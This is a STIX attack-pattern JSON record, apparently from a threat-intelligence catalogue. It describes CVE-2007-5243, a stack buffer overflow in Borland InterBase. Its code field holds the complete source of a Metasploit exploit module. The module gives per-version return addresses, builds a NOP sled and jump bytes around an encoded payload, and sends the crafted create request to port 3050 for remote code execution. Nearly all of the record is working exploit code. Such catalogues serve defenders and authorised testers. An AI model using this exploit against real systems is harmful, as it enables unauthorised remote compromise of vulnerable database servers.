{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--58779a99-0287-4112-887e-0e9aefb79e02",
    "created": "2024-08-14T16:47:30.564128Z",
    "modified": "2024-08-14T16:47:30.564132Z",
    "name": "Borland InterBase isc_create_database() Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Borland InterBase by sending a specially crafted create request. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ib_isc_create_database.rb",
            "external_id": "ib_isc_create_database.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5243"
        },
        {
            "source_name": "reference",
            "url": "http://www.risesecurity.org/advisories/RISE-2007002.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::BruteTargets\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Borland InterBase isc_create_database() Buffer Overflow',\n      'Description'\t=> %q{\n        This module exploits a stack buffer overflow in Borland InterBase\n        by sending a specially crafted create request.\n      },\n      'Author'\t=>\n        [\n          'Ramon de C Valle',\n          'Adriano Lima <adriano[at]risesecurity.org>',\n        ],\n      'Arch'\t\t=> ARCH_X86,\n      'Platform'\t=> 'win',\n      'References'\t=>\n        [\n          [ 'CVE', '2007-5243' ],\n          [ 'OSVDB', '38606' ],\n          [ 'BID', '25917' ],\n          [ 'URL', 'http://www.risesecurity.org/advisories/RISE-2007002.txt' ],\n        ],\n      'Privileged'\t=> true,\n      'License'\t=> MSF_LICENSE,\n      'Payload'\t=>\n        {\n          'Space' => 512,\n          'BadChars' => \"\\x00\\x2f\\x3a\\x40\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Targets'\t=>\n        [\n          [ 'Brute Force', { } ],\n          # 0x00403d4b pop esi; pop ebp; ret\n          [\n            'Borland InterBase WI-V8.1.0.257',\n            { 'Length' => [ 2116, 2120 ], 'Ret' => 0x00403d4b }\n          ],\n          # 0x00403d4d pop esi; pop ebp; ret\n          [\n            'Borland InterBase WI-V8.0.0.123',\n            { 'Length' => [ 2116, 2120 ], 'Ret' => 0x00403d4d }\n          ],\n          # 0x00403a5d pop esi; pop ebp; ret\n          [\n            'Borland InterBase WI-V7.5.0.129 WI-V7.5.1.80',\n            { 'Length' => [ 2116, 2120 ], 'Ret' => 0x00403a5d }\n          ],\n          # 0x004038fd pop esi; pop ebp; ret\n          [\n            'Borland InterBase WI-V7.0.1.1',\n            { 'Length' => [ 2116, 2120 ], 'Ret' => 0x004038fd }\n          ],\n          # 0x0040390d pop esi; pop ebp; ret\n          [\n            'Borland InterBase WI-V6.5.0.28',\n            { 'Length' => [ 1332, 1336 ], 'Ret' => 0x0040390d }\n          ],\n          # 0x00403901 pop esi; pop ebp; ret\n          [\n            'Borland InterBase WI-V6.0.1.6',\n            { 'Length' => [ 1332, 1336 ], 'Ret' => 0x00403901 }\n          ],\n          # 0x004038b1 pop esi; pop ebp; ret\n          [\n            'Borland InterBase WI-V6.0.0.627 WI-V6.0.1.0 WI-O6.0.1.6 WI-O6.0.2.0',\n            { 'Length' => [ 1332, 1336 ], 'Ret' => 0x004038b1 }\n          ],\n          # 0x00404a10 pop esi; pop ebp; ret\n          [\n            'Borland InterBase WI-V5.5.0.742',\n            { 'Length' => [ 1432, 1436 ], 'Ret' => 0x00404a10 }\n          ],\n          # 0x00404a0e pop esi; pop ebp; ret\n          [\n            'Borland InterBase WI-V5.1.1.680',\n            { 'Length' => [ 1336, 1340 ], 'Ret' => 0x00404a0e }\n          ],\n          # Debug\n          [\n            'Debug',\n            { 'Length' => [ 1336 ], 'Ret' => 0xaabbccdd }\n          ],\n        ],\n      'DefaultTarget'\t=> 0,\n      'DisclosureDate'  => '2007-10-03'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(3050)\n      ],\n      self.class\n    )\n\n  end\n\n  def exploit_target(target)\n\n    target['Length'].each do |length|\n\n      connect\n\n      # Create database\n      op_create = 20\n\n      remainder = length.remainder(4)\n      padding = 0\n\n      if remainder > 0\n        padding = (4 - remainder)\n      end\n\n      buf = ''\n\n      # Operation/packet type\n      buf << [op_create].pack('N')\n\n      # Id\n      buf << [0].pack('N')\n\n      # Length\n      buf << [length].pack('N')\n\n      # Nop block\n      buf << make_nops(length - payload.encoded.length - 13)\n\n      # Payload\n      buf << payload.encoded\n\n      # Jump back into the nop block\n      buf << \"\\xe9\" + [-1028].pack('V')\n\n      # Jump back\n      buf << \"\\xeb\" + [-7].pack('c')\n\n      # Random alpha data\n      buf << rand_text_alpha(2)\n\n      # Target\n      buf << [target.ret].pack('V')\n\n      # Padding\n      buf << \"\\x00\" * padding\n\n      # Database parameter block\n\n      # Length\n      buf << [1024].pack('N')\n\n      # Random alpha data\n      buf << rand_text_alpha(1024)\n\n      sock.put(buf)\n\n      select(nil,nil,nil,4)\n\n      handler\n\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-10-03",
    "x_mitre_platforms": [
        "win'"
    ]
}